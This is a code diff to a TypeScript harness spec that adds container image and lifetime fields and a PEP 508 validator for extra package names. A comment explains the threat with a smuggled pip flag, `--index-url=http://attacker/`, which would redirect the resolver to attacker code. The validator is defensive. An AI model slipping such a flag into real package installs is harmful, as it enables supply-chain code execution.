@@ -38,6 +38,10 @@ export interface HarnessSpec {
     name: string;
     version: string;
     cuda_image?: string;
+    /** Runtime image with the engine already installed. Required by the sandbox path. */
+    image?: string;
+    /** vllm/vllm-openai ships an ENTRYPOINT that double-invokes an explicit command. */
+    clear_entrypoint?: boolean;
     python_version?: string;
     extra_packages?: string[];
     env?: Record<string, string>;
@@ -59,6 +63,10 @@ export interface HarnessSpec {
     startup_timeout_s?: number;
     max_containers?: number;
     target_concurrency?: number;
+    /** Sandbox path: self-terminate after this much inactivity. */
+    idle_timeout_s?: number;
+    /** Sandbox path: hard spend ceiling, enforced even if idle detection fails. */
+    max_lifetime_s?: number;
   };
   client?: {
     context_window?: number;
@@ -77,7 +85,30 @@ function py(s: string): string {
 /** Reject anything that could break out of an argv token or a filename. */
 const SAFE = /^[A-Za-z0-9._\-\/:=+@]*$/;
 
-function assertSafe(label: string, value: string): string {
+/**
+ * A package name is not an argv token, and must not be validated like one.
+ *
+ * SAFE deliberately permits leading dashes and slashes because argv tokens need
+ * them. Reusing it for `extra_packages` would let a spec smuggle pip flags -
+ * `--index-url=http://attacker/` redirects the resolver and runs attacker code
+ * inside the image build. Specs come from the harness service, so this is a
+ * trust boundary: a package name must look like PEP 508 and nothing else.
+ * Anchored on [A-Za-z0-9], so a leading dash cannot parse at all.
+ */
+const PEP508 =
+  /^[A-Za-z0-9][A-Za-z0-9._-]*(\[[A-Za-z0-9,._-]+\])?((==|>=|<=|~=|!=|>|<)[A-Za-z0-9._*+-]+)?$/;
+
+export function assertPackageName(value: string): string {
+  if (!PEP508.test(value)) {
+    throw new Error(
+      `refusing extra_packages entry ${JSON.stringify(value)}: not a package name. ` +
+        `Flags, paths and URLs are not accepted here. This spec may be malformed or hostile.`,
+    );
+  }
+  return value;
+}
+
+export function assertSafe(label: string, value: string): string {
   if (!SAFE.test(value)) {
     throw new Error(
       `refusing to render ${label}: ${JSON.stringify(value)} contains characters ` +
